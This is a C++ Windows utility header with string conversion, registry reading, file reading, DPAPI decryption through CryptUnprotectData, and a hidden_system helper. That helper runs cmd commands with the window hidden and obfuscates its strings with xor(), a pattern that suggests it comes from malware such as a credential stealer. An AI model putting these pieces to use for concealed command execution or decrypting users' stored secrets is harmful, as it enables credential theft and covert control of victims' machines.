#pragma once

#include "../config.hpp"
#include <shellapi.h>
#include <wincrypt.h>

inline std::wstring s2ws(const std::string &str) {
  int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
  std::wstring wstr(size_needed, 0);
  MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
  return wstr;
}

inline std::string ws2s(const std::wstring &wstr) {
  int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
  std::string str(size_needed, 0);
  WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL);
  return str;
}

template <typename T> inline T read_registry_key(HKEY hkey, const std::string &sub_key, const std::string &value_name) {
  T data;
  DWORD size = 0;
  if (RegOpenKeyEx(hkey, sub_key.c_str(), 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
    RegQueryValueEx(hkey, value_name.c_str(), NULL, NULL, NULL, &size);
    std::vector<char> buffer(size);
    RegQueryValueEx(hkey, value_name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(buffer.data()), &size);
    if constexpr (std::is_same_v<T, std::string>) {
      data = std::string(buffer.data(), buffer.size());
    } else {
      data = *reinterpret_cast<T *>(buffer.data());
    }

    RegCloseKey(hkey);
  }

  return data;
}

inline int crypt_unprotect_data(const std::string &data, std::string &output) {
  DATA_BLOB in = {data.size(), (BYTE *)data.data()};
  DATA_BLOB out;
  if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
    return GetLastError();

  output.resize(out.cbData);
  std::copy(out.pbData, out.pbData + out.cbData, output.begin());
  LocalFree(out.pbData);
  return 0;
}

template <typename... Args> std::string va(const std::string &fmt, Args... args) {
  size_t size = snprintf(nullptr, 0, fmt.c_str(), args...) + 1;
  std::unique_ptr<char[]> buf(new char[size]);
  snprintf(buf.get(), size, fmt.c_str(), args...);
  return std::string(buf.get(), buf.get() + size - 1);
}

inline int read_binary_file(const std::filesystem::path &file, std::string &output) {
  HANDLE hFile = CreateFileW(file.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (hFile == INVALID_HANDLE_VALUE)
    return GetLastError();

  DWORD size = GetFileSize(hFile, NULL);
  if (size == INVALID_FILE_SIZE) {
    CloseHandle(hFile);
    return GetLastError();
  }

  output.resize(size);

  DWORD read;
  if (!ReadFile(hFile, &output[0], size, &read, NULL) || read != size) {
    CloseHandle(hFile);
    return GetLastError();
  }

  CloseHandle(hFile);

  return 0;
}

inline void hidden_system(const char *cmd) { ShellExecuteA(nullptr, xor("open"), xor("cmd"), va(xor("/c %s"), cmd).c_str(), nullptr, SW_HIDE); }
